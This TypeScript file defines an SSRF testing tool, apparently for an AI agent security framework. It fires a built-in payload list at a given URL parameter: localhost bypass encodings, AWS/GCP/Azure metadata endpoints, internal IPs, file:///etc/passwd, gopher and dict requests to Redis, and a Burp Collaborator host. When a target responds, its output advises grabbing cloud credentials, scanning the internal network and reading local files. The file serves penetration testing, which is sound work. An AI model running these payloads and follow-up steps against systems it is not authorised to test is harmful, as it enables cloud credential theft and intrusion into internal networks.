/**
 * Tool: ssrf_test
 *
 * Server-Side Request Forgery testing.
 */

import z from "zod"
import { Tool } from "../../tool/tool"
import { testPayloads, type PayloadPosition } from "../scanner/test-payloads"

const DESCRIPTION = `Test for Server-Side Request Forgery (SSRF) vulnerabilities.
Tests if the application can be tricked into making requests to internal resources.

Requires: target URL and parameter that accepts URLs or IP addresses.

CHAIN POTENTIAL: SSRF enables:
- Access to cloud metadata (AWS/GCP/Azure credentials)
- Internal network scanning (port scan from inside)
- Access to internal services (databases, admin panels)
- Read local files via file:// protocol`

const SSRF_PAYLOADS = [
  // Localhost bypass
  "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
  "http://[::1]", "http://0x7f000001", "http://2130706433",
  "http://017700000001", "http://127.1", "http://127.0.0.1:80",
  // Cloud metadata
  "http://169.254.169.254/latest/meta-data/", // AWS
  "http://metadata.google.internal/computeMetadata/v1/", // GCP
  "http://169.254.169.254/metadata/instance", // Azure
  // Internal networks
  "http://192.168.1.1", "http://10.0.0.1", "http://172.16.0.1",
  // Protocol handlers
  "file:///etc/passwd", "file:///etc/hostname",
  "dict://localhost:6379/info", "gopher://localhost:6379/_info",
  // DNS rebinding / redirect
  "http://spoofed.burpcollaborator.net",
]

const SSRF_SUCCESS = [
  // AWS metadata indicators
  "ami-", "instance-id", "iam/security-credentials",
  // GCP metadata
  "computeMetadata", "project-id",
  // Azure
  "compute", "network",
  // Local file
  "root:", "localhost",
  // Internal
  "Apache", "nginx", "Welcome",
  // Redis
  "redis_version",
]

const SSRF_FAILURE = [
  "unrecognized target url",
  "invalid url",
  "unsupported protocol",
  "url not allowed",
  "blocked url",
  "could not resolve",
  "name or service not known",
]

export const SsrfTestTool = Tool.define("ssrf_test", {
  description: DESCRIPTION,
  parameters: z.object({
    url: z.string().describe("Target URL"),
    parameter: z.string().describe("Parameter that accepts URLs/IPs"),
    position: z
      .enum(["query", "body", "json", "header"])
      .default("query")
      .describe("Injection position"),
    method: z.enum(["GET", "POST"]).optional().describe("HTTP method"),
    headers: z.record(z.string(), z.string()).optional().describe("Extra headers"),
    cookies: z.string().optional().describe("Cookies"),
  }),
  async execute(params, ctx) {
    await ctx.ask({
      permission: "ssrf_test",
      patterns: [params.url],
      always: [] as string[],
      metadata: { url: params.url, parameter: params.parameter } as Record<string, any>,
    })

    ctx.metadata({ title: `Testing SSRF on ${params.parameter}...` })

    const result = await testPayloads({
      url: params.url,
      sessionID: ctx.sessionID,
      method: params.method,
      parameter: params.parameter,
      position: params.position as PayloadPosition,
      payloads: SSRF_PAYLOADS,
      successIndicators: SSRF_SUCCESS,
      failureIndicators: SSRF_FAILURE,
      headers: params.headers,
      cookies: params.cookies,
      concurrency: 3,
    })

    const parts: string[] = []
    if (result.vulnerable) {
      const vulns = result.results.filter((r) => r.vulnerable)
      parts.push(`⚠ SSRF VULNERABLE on parameter "${params.parameter}"`)
      parts.push("")
      for (const v of vulns) {
        parts.push(`Payload: ${v.payload}`)
        parts.push(`Evidence: ${v.evidence}`)
        parts.push(`Status: ${v.status} | Time: ${v.elapsed}ms`)
        parts.push("")
      }
      parts.push("NEXT STEPS:")
      parts.push("- Try to access cloud metadata endpoints for credentials")
      parts.push("- Scan internal network from the server's perspective")
      parts.push("- Try file:// for local file read")
    } else {
      parts.push(`No SSRF found on "${params.parameter}" (${result.testedCount} payloads tested)`)
    }

    return {
      title: result.vulnerable ? `⚠ SSRF found on ${params.parameter}` : `No SSRF on ${params.parameter}`,
      metadata: { vulnerable: result.vulnerable, tested: result.testedCount } as any,
      output: parts.join("\n"),
    }
  },
})
